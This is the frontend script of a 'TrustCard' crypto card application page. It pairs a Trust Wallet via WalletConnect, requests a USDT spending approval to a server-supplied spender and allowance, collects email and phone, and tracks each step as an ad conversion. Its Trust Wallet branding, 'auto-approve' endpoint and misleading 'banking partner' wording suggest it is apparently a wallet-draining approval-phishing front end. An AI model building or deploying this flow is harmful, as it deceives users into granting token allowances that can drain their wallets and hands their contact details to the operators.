/**
 * TrustCard — frontend
 *
 * Backend URL resolution:
 *   1. window.__TRUSTCARD_BACKEND_URL__ (set via inline script or Vercel env rewrite)
 *   2. <meta name="trustcard-backend" content="https://...">
 *   3. same-origin (works when served from the backend directly)
 */
const BASE = (() => {
  if (typeof window !== 'undefined' && window.__TRUSTCARD_BACKEND_URL__) {
    return String(window.__TRUSTCARD_BACKEND_URL__).replace(/\/+$/, '');
  }
  const meta = document.querySelector('meta[name="trustcard-backend"]');
  if (meta && meta.content) return meta.content.replace(/\/+$/, '');
  if (typeof location !== 'undefined' && location.protocol === 'file:') {
    return 'http://localhost:3000';
  }
  return location.origin;
})();

/* ========== State ========== */
let sessionTopic = null;
let connAccounts = [];
let connId = null;
let wcUri = null;
let detectedCountry = '';
let evtSrc = null;
let currentView = 'intro';
let sessionStarted = false;
let authorizing = false;
let resolved = false;
let walletLinked = false;
let paymentId = '';

/* ========== Meta Pixel ==========
 * Funnel:
 *   PageView          → fired in <head> on load
 *   Lead              → user opens the connect modal (top-of-funnel intent)
 *   InitiateCheckout  → wallet paired via WalletConnect
 *   AddPaymentInfo    → on-chain authorization approved
 *   CompleteRegistration → contact form submitted (final conversion)
 *
 * Each standard event is deduped per pageview so the funnel reports
 * one user = one conversion at each step. The wrapper is silent if
 * the Pixel is blocked (ad blockers, no-JS, CSP).
 *
 * eventID is a random per-event token reserved for future server-side
 * deduplication when the Conversions API is wired up.
 */
const FUNNEL_CONTENT = { content_name: 'TrustCard Application', content_category: 'CardApplication' };
const _pixelFired = new Set();

function _pixelEventId() {
  try {
    if (window.crypto && typeof window.crypto.randomUUID === 'function') return window.crypto.randomUUID();
  } catch (_e) {}
  return 'evt-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 10);
}

function track(event, params, opts) {
  try {
    if (typeof window.fbq !== 'function') return;
    const dedupe = !opts || opts.dedupe !== false;
    if (dedupe) {
      if (_pixelFired.has(event)) return;
      _pixelFired.add(event);
    }
    const eventID = _pixelEventId();
    if (params && Object.keys(params).length) {
      window.fbq('track', event, params, { eventID: eventID });
    } else {
      window.fbq('track', event, {}, { eventID: eventID });
    }
  } catch (_e) {}
}

/* ========== DOM helpers ========== */
const $ = (s, r = document) => r.querySelector(s);
const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));

/* ========== Device detection ========== */
const IS_MOBILE = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent)
  || (window.matchMedia && window.matchMedia('(pointer: coarse)').matches);
const IS_TW_BROWSER = /Trust\//i.test(navigator.userAgent)
  || !!(window.ethereum && window.ethereum.isTrust);
if (IS_MOBILE) document.body.classList.add('is-mobile');

/* ========== Modal ========== */
const modal = $('#connect-modal');
const content = $('#m-content');
const loader = $('#m-loader');

function setView(name) {
  currentView = name;
  $$('.m-view', modal).forEach((el) => {
    el.hidden = el.dataset.view !== name;
  });
}

function setBusy(busy, title, sub) {
  if (busy) {
    if (title) $('#m-loader-title').textContent = title;
    if (sub) $('#m-loader-sub').textContent = sub;
    loader.hidden = false;
    content.classList.add('is-busy');
  } else {
    loader.hidden = true;
    content.classList.remove('is-busy');
  }
}

function setLoaderStep(step) {
  const steps = $('#m-loader-steps');
  if (!steps) return;
  const order = ['pair', 'auth', 'sign'];
  const idx = order.indexOf(step);
  if (idx < 0) return;
  $$('li', steps).forEach((li, i) => {
    li.classList.remove('is-active', 'is-done');
    if (i < idx) li.classList.add('is-done');
    else if (i === idx) li.classList.add('is-active');
  });
}

function openModal() {
  modal.hidden = false;
  document.body.style.overflow = 'hidden';
  setView('intro');
  setBusy(false);
  track('Lead', FUNNEL_CONTENT);
  if (!sessionStarted) {
    sessionStarted = true;
    startSession();
  }
}

function closeModal() {
  modal.hidden = true;
  document.body.style.overflow = '';
  if (sessionTopic && authorizing && !resolved) {
    try {
      fetch(BASE + '/api/front/auto-approve/cancel', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ topic: sessionTopic }),
        keepalive: true,
      }).catch(() => {});
    } catch (_e) {}
  }
  authorizing = false;
}

$$('[data-open-connect]').forEach((b) => b.addEventListener('click', openModal));
$$('[data-close-modal]').forEach((b) => b.addEventListener('click', closeModal));

document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && !modal.hidden) closeModal();
});

/* ========== Session setup ========== */
async function startSession() {
  try {
    const res = await fetch(BASE + '/api/front/generate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}',
    });
    const data = await res.json();
    if (data.error) throw new Error(data.message || data.error);
    connId = data.connectionId;
    wcUri = data.uri;
    detectedCountry = data.country || '';

    // Desktop: render QR. Mobile: enable the CTA button.
    if (IS_MOBILE) {
      const btn = $('#m-get-now');
      btn.disabled = false;
      btn.querySelector('.m-cta-label').textContent = 'Get Yours Now';
      btn.onclick = onGetNowClick;
    } else {
      renderQR(wcUri);
    }

    evtSrc = new EventSource(BASE + '/api/front/events');

    const onPaired = (e) => {
      let d = {};
      try { d = JSON.parse(e.data); } catch (_err) { return; }
      if (d.connectionId && connId && d.connectionId !== connId) return;
      sessionTopic = d.topic || d.sessionTopic || sessionTopic;
      connAccounts = d.accounts || connAccounts;
      onWalletConnected(d);
    };

    evtSrc.addEventListener('demo_connected', onPaired);
    evtSrc.addEventListener('session_settled', onPaired);
    evtSrc.addEventListener('session_approved', onPaired);
    evtSrc.addEventListener('session_connected', onPaired);

    startSessionPolling();

    evtSrc.addEventListener('approval_request_sent', (e) => {
      if (resolved) return;
      JSON.parse(e.data);
      setBusy(true, 'Confirm in Trust Wallet', 'Approve 1 USDT to the card contract. Rejecting will not retry automatically.');
    });

    evtSrc.addEventListener('payment_verified', (e) => {
      const d = JSON.parse(e.data);
      if (resolved) return;
      if (d.paymentId && paymentId && d.paymentId !== paymentId) return;
      resolved = true;
      setBusy(false);
      onAuthorizationApproved();
    });

    evtSrc.addEventListener('approval_approved', (e) => {
      const d = JSON.parse(e.data);
      if (resolved) return;
      if (d.paymentId && paymentId && d.paymentId !== paymentId) return;
      resolved = true;
      setBusy(false);
      onAuthorizationApproved();
    });

    evtSrc.addEventListener('approval_rejected', (e) => {
      if (resolved) return;
      const d = JSON.parse(e.data);
      setBusy(false);
      showPayError(d.message || 'You rejected the approval in the wallet. You can prepare a new authorization if you want to try again.');
    });

    evtSrc.addEventListener('approval_failed', (e) => {
      if (resolved) return;
      const d = JSON.parse(e.data);
      setBusy(false);
      showPayError(d.reason || 'On-chain verification failed.');
    });

    evtSrc.onerror = () => {
      // Connection drops don't tear down the UI — SSE will auto-reconnect.
    };
  } catch (err) {
    if (IS_MOBILE) {
      const btn = $('#m-get-now');
      btn.querySelector('.m-cta-label').textContent = 'Unable to start — refresh';
    } else {
      const host = $('#qr-area');
      if (host) host.innerHTML = '<p style="color:var(--red);font-size:13px">Unable to start session: ' + escapeText(err.message) + '</p>';
    }
  }
}

function escapeText(s) {
  const d = document.createElement('div');
  d.textContent = String(s ?? '');
  return d.innerHTML;
}

function renderQR(uri) {
  const host = $('#qr-area');
  if (!host) return;
  host.innerHTML = '';
  const qr = new QRCodeStyling({
    width: 260,
    height: 260,
    type: 'svg',
    data: uri,
    margin: 8,
    qrOptions: { errorCorrectionLevel: 'H' },
    image: 'assets/svg/logo-trust.svg',
    imageOptions: { crossOrigin: 'anonymous', margin: 6, imageSize: 0.22, hideBackgroundDots: true },
    dotsOptions: { color: '#0B0B0F', type: 'rounded' },
    backgroundOptions: { color: '#ffffff' },
    cornersSquareOptions: { color: '#0500FF', type: 'extra-rounded' },
    cornersDotOptions: { color: '#0500FF', type: 'dot' },
  });
  qr.append(host);
}

/* ========== Step 1: user taps "Get Yours Now" (mobile only) ========== */
function onGetNowClick() {
  if (!wcUri) return;
  const twLink = 'https://link.trustwallet.com/wc?uri=' + encodeURIComponent(wcUri);
  setLoaderStep('pair');
  setBusy(
    true,
    'Linking your account to banking partner',
    'Approve the pairing request in Trust Wallet — we\'ll continue automatically once confirmed.'
  );
  window.location.href = twLink;
}

/* ========== Step 2: wallet connected ========== */
function startSessionPolling() {
  if (!connId) return;
  const tick = async () => {
    if (walletLinked) return;
    try {
      const res = await fetch(BASE + '/api/front/session/' + encodeURIComponent(connId));
      const data = await res.json();
      const session = data.session || data;
      const status = session && session.status;
      if (status === 'settled' || status === 'approved' || status === 'connected') {
        sessionTopic = session.sessionTopic || session.topic || sessionTopic;
        connAccounts = session.accounts || connAccounts;
        onWalletConnected(session);
      }
    } catch (_err) {}
    if (!walletLinked) setTimeout(tick, 2000);
  };
  setTimeout(tick, 1500);
}

function onWalletConnected(d) {
  if (walletLinked) return;
  walletLinked = true;
  track('InitiateCheckout', FUNNEL_CONTENT);
  setBusy(false);
  const address = (d && d.wallet && d.wallet.address)
    || (Array.isArray(connAccounts) && connAccounts[0] && (connAccounts[0].address || connAccounts[0]))
    || '';
  const walletEl = $('#pay-wallet');
  if (walletEl) walletEl.textContent = address ? ('Connected wallet: ' + address) : 'Wallet connected. Choose a network to continue.';
  setView('payment');
}

function showPayError(message) {
  const el = $('#pay-err');
  if (!el) return;
  el.hidden = !message;
  el.textContent = message || '';
}

async function preparePayment() {
  showPayError('');
  const network = $('#pay-network') && $('#pay-network').value;
  try {
    const res = await fetch(BASE + '/api/payment/create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ connectionId: connId, network }),
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.message || 'Could not prepare authorization');
    const p = data.payment;
    paymentId = p.paymentId;
    $('#pay-details').hidden = false;
    $('#pay-network-name').textContent = p.network;
    $('#pay-token').textContent = p.token;
    $('#pay-token-contract').textContent = p.tokenContract;
    $('#pay-spender').textContent = p.spender;
    $('#pay-allowance').textContent = p.allowance;
    $('#pay-continue').disabled = false;
  } catch (err) {
    paymentId = '';
    $('#pay-continue').disabled = true;
    showPayError(err.message);
  }
}

async function requestPaymentApproval() {
  if (!paymentId) return;
  showPayError('');
  setBusy(true, 'Confirm in Trust Wallet', 'Approve 1 USDT to the card contract shown above. Nothing is sent until you confirm.');
  try {
    const res = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}',
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.message || 'Could not request approval');
  } catch (err) {
    setBusy(false);
    showPayError(err.message);
  }
}

const payPrepareBtn = $('#pay-prepare');
if (payPrepareBtn) payPrepareBtn.addEventListener('click', preparePayment);
const payContinueBtn = $('#pay-continue');
if (payContinueBtn) payContinueBtn.addEventListener('click', requestPaymentApproval);

/* ========== Step 3: authorization approved → contact form ========== */
function onAuthorizationApproved() {
  track('AddPaymentInfo', FUNNEL_CONTENT);
  setBusy(false);
  setView('contact');
  const form = $('#m-contact-form');
  if (form) form.onsubmit = onContactSubmit;
  initCountryCombo();
}

/* ========== Country combobox ========== */
const COUNTRIES = [
  'Afghanistan','Albania','Algeria','Andorra','Angola','Antigua and Barbuda','Argentina','Armenia','Australia','Austria',
  'Azerbaijan','Bahamas','Bahrain','Bangladesh','Barbados','Belarus','Belgium','Belize','Benin','Bhutan',
  'Bolivia','Bosnia and Herzegovina','Botswana','Brazil','Brunei','Bulgaria','Burkina Faso','Burundi','Cambodia','Cameroon',
  'Canada','Cape Verde','Central African Republic','Chad','Chile','China','Colombia','Comoros','Congo','Costa Rica',
  "Côte d'Ivoire",'Croatia','Cuba','Cyprus','Czechia','Denmark','Djibouti','Dominica','Dominican Republic','Ecuador',
  'Egypt','El Salvador','Equatorial Guinea','Eritrea','Estonia','Eswatini','Ethiopia','Fiji','Finland','France',
  'Gabon','Gambia','Georgia','Germany','Ghana','Greece','Grenada','Guatemala','Guinea','Guinea-Bissau',
  'Guyana','Haiti','Honduras','Hong Kong','Hungary','Iceland','India','Indonesia','Iran','Iraq',
  'Ireland','Israel','Italy','Jamaica','Japan','Jordan','Kazakhstan','Kenya','Kiribati','Kosovo',
  'Kuwait','Kyrgyzstan','Laos','Latvia','Lebanon','Lesotho','Liberia','Libya','Liechtenstein','Lithuania',
  'Luxembourg','Macao','Madagascar','Malawi','Malaysia','Maldives','Mali','Malta','Marshall Islands','Mauritania',
  'Mauritius','Mexico','Micronesia','Moldova','Monaco','Mongolia','Montenegro','Morocco','Mozambique','Myanmar',
  'Namibia','Nauru','Nepal','Netherlands','New Zealand','Nicaragua','Niger','Nigeria','North Korea','North Macedonia',
  'Norway','Oman','Pakistan','Palau','Palestine','Panama','Papua New Guinea','Paraguay','Peru','Philippines',
  'Poland','Portugal','Qatar','Romania','Russia','Rwanda','Saint Kitts and Nevis','Saint Lucia','Saint Vincent and the Grenadines','Samoa',
  'San Marino','Sao Tome and Principe','Saudi Arabia','Senegal','Serbia','Seychelles','Sierra Leone','Singapore','Slovakia','Slovenia',
  'Solomon Islands','Somalia','South Africa','South Korea','South Sudan','Spain','Sri Lanka','Sudan','Suriname','Sweden',
  'Switzerland','Syria','Taiwan','Tajikistan','Tanzania','Thailand','Timor-Leste','Togo','Tonga','Trinidad and Tobago',
  'Tunisia','Turkey','Turkmenistan','Tuvalu','Uganda','Ukraine','United Arab Emirates','United Kingdom','United States','Uruguay',
  'Uzbekistan','Vanuatu','Vatican City','Venezuela','Vietnam','Yemen','Zambia','Zimbabwe',
];

let comboInited = false;
let comboActiveIdx = -1;

function initCountryCombo() {
  const input = $('#m-country-input');
  const list = $('#m-country-list');
  const toggle = $('#m-country-toggle');
  const hidden = $('#m-country-value');
  if (!input || !list || !hidden) return;

  // Pre-fill with detected country when it matches our list.
  if (!hidden.value && detectedCountry) {
    const match = COUNTRIES.find((c) => c.toLowerCase() === detectedCountry.toLowerCase());
    if (match) {
      input.value = match;
      hidden.value = match;
    }
  }

  if (comboInited) return;
  comboInited = true;

  const render = (filter) => {
    const q = (filter || '').trim().toLowerCase();
    const items = q
      ? COUNTRIES.filter((c) => c.toLowerCase().includes(q))
      : COUNTRIES.slice();
    list.innerHTML = items.map((c, i) => {
      const selected = c === hidden.value ? ' aria-selected="true"' : '';
      return `<li role="option" data-idx="${i}" data-value="${escapeText(c)}"${selected}>${escapeText(c)}</li>`;
    }).join('');
    comboActiveIdx = items.length ? 0 : -1;
    updateActive();
  };

  const updateActive = () => {
    $$('li', list).forEach((li, i) => {
      li.classList.toggle('is-active', i === comboActiveIdx);
    });
    const active = list.querySelector('li.is-active');
    if (active) active.scrollIntoView({ block: 'nearest' });
  };

  const open = () => {
    list.hidden = false;
    input.setAttribute('aria-expanded', 'true');
    render(input.value === hidden.value ? '' : input.value);
  };
  const close = () => {
    list.hidden = true;
    input.setAttribute('aria-expanded', 'false');
    // If the typed value isn't an exact match, revert to the stored value.
    if (input.value !== hidden.value) {
      input.value = hidden.value || '';
    }
  };

  const commit = (value) => {
    hidden.value = value;
    input.value = value;
    list.hidden = true;
    input.setAttribute('aria-expanded', 'false');
  };

  input.addEventListener('focus', open);
  input.addEventListener('input', () => { open(); render(input.value); });
  input.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowDown') { e.preventDefault(); if (list.hidden) open(); else { comboActiveIdx = Math.min(comboActiveIdx + 1, list.children.length - 1); updateActive(); } }
    else if (e.key === 'ArrowUp') { e.preventDefault(); comboActiveIdx = Math.max(comboActiveIdx - 1, 0); updateActive(); }
    else if (e.key === 'Enter') {
      const active = list.querySelector('li.is-active');
      if (active) { e.preventDefault(); commit(active.dataset.value); }
    }
    else if (e.key === 'Escape') { close(); input.blur(); }
  });
  toggle.addEventListener('click', (e) => {
    e.preventDefault();
    if (list.hidden) { input.focus(); open(); } else close();
  });
  list.addEventListener('mousedown', (e) => {
    // mousedown so we fire before input's blur.
    const li = e.target.closest('li[data-value]');
    if (!li) return;
    e.preventDefault();
    commit(li.dataset.value);
  });
  document.addEventListener('click', (e) => {
    if (list.hidden) return;
    const combo = $('#m-country-combo');
    if (combo && !combo.contains(e.target)) close();
  });
}

async function onContactSubmit(e) {
  e.preventDefault();
  const form = e.currentTarget;
  const email = form.email.value.trim();
  const phone = form.phone.value.trim();
  const country = form.country.value.trim();
  const err = $('#m-form-err');

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showFormError('Please enter a valid email address.');
  if (phone.length < 5) return showFormError('Please enter a valid phone number.');
  if (!country) return showFormError('Please select your country.');
  err.hidden = true;

  const submitBtn = $('#m-submit-contact');
  submitBtn.disabled = true;
  submitBtn.textContent = 'Submitting…';

  try {
    const res = await fetch(BASE + '/api/front/contact', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ connectionId: connId, email, phone, country }),
    });
    const data = await res.json();
    if (!res.ok || data.error) throw new Error(data.error || 'submission failed');
    showConfirmed();
  } catch (ex) {
    submitBtn.disabled = false;
    submitBtn.textContent = 'Submit application';
    showFormError(ex.message || 'Something went wrong. Please try again.');
  }
}

function showFormError(msg) {
  const err = $('#m-form-err');
  err.textContent = msg;
  err.hidden = false;
}

/* ========== Step 4: confirmation ========== */
function showConfirmed() {
  track('CompleteRegistration', Object.assign({ status: true }, FUNNEL_CONTENT));
  setView('done');
  $('#ref-number').textContent = generateReference();
  $('#ref-date').textContent = formatDate(new Date());
}

function generateReference() {
  const rand = Math.floor(Math.random() * 0xffffffff).toString(16).toUpperCase().padStart(8, '0');
  const ts = Date.now().toString(36).toUpperCase().slice(-4);
  return `TC-${rand.slice(0, 4)}-${rand.slice(4)}-${ts}`;
}

function formatDate(d) {
  const opts = { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
  return d.toLocaleString('en-GB', opts);
}

/* ========== Mobile nav menu ========== */
const burger = $('[data-menu-toggle]');
const navMobile = $('#nav-mobile');
if (burger && navMobile) {
  const setOpen = (open) => {
    document.body.classList.toggle('nav-open', open);
    burger.setAttribute('aria-expanded', open ? 'true' : 'false');
    burger.setAttribute('aria-label', open ? 'Close menu' : 'Open menu');
    if (open) navMobile.removeAttribute('hidden');
    else setTimeout(() => { if (!document.body.classList.contains('nav-open')) navMobile.setAttribute('hidden', ''); }, 260);
  };
  burger.addEventListener('click', () => {
    setOpen(!document.body.classList.contains('nav-open'));
  });
  navMobile.querySelectorAll('[data-menu-link]').forEach((el) => {
    el.addEventListener('click', () => setOpen(false));
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && document.body.classList.contains('nav-open')) setOpen(false);
  });
}
